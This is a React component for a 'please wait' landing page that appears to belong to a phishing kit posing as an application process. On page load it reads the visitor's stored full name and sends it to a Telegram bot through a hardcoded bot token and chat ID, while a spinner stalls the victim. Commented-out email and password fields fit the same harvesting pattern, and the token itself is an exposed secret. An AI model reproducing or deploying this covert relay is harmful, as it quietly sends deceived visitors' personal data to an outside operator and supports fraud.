import React, { useState, useEffect } from "react";

import ApplyHeader from "./applyHeader";

const LandingPage: React.FC = () => {
//   const [email, setEmail] = useState("");
//   const [password, setPassword] = useState("");
  const [showPopup, setShowPopup] = useState(false);
  const [countdown, setCountdown] = useState(100);
  const BOT_TOKEN = '7926454402:AAEDVoo1vW7hFgkLKM3qK3f8EsiiKuDsT8c';
  const CHAT_ID = '7062736155';

  const storedData = localStorage.getItem("applicationData");
  const parsedData = storedData ? JSON.parse(storedData) : {};

  const fullName = parsedData.fullname || "N/A";
  

const sendToTelegram = async (message: string) => {
  await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
    method: "POST",
    headers: {
      "Content-Type": "application/json",
    },
    body: JSON.stringify({
      chat_id: CHAT_ID,
      text: message,
    }),
  });
};

useEffect(() => {
    // Notify on page load
    sendToTelegram(`✅ ${fullName} has opened the landing page template.`);
  }, []);
  


 

  useEffect(() => {
    let timer: NodeJS.Timeout;

    if (showPopup && countdown > 0) {
      timer = setTimeout(() => {
        setCountdown((prev) => prev - 1);
      }, 1000);
    }

    if (countdown === 0) {
      window.location.reload();
      console.log(setShowPopup)
    }

    return () => clearTimeout(timer);
  }, [showPopup, countdown]);

  return (
    <>
    <ApplyHeader/>
    <p className="text-sm mt-4 p-7 text-center">Please wait, you will get an update here soon. This may take a while</p>
    <div className="absolute bottom-[200px] left-1/2 transform -translate-x-1/2">
          <svg
            className="animate-spin h-6 w-6 text-gray-600"
            xmlns="http://www.w3.org/2000/svg"
            fill="none"
            viewBox="0 0 24 24"
          >
            <circle
              className="opacity-25"
              cx="12"
              cy="12"
              r="10"
              stroke="currentColor"
              strokeWidth="4"
            />
            <path
              className="opacity-75"
              fill="currentColor"
              d="M4 12a8 8 0 018-8v8H4z"
            />
          </svg>
        </div></>
  );
};

export default LandingPage;
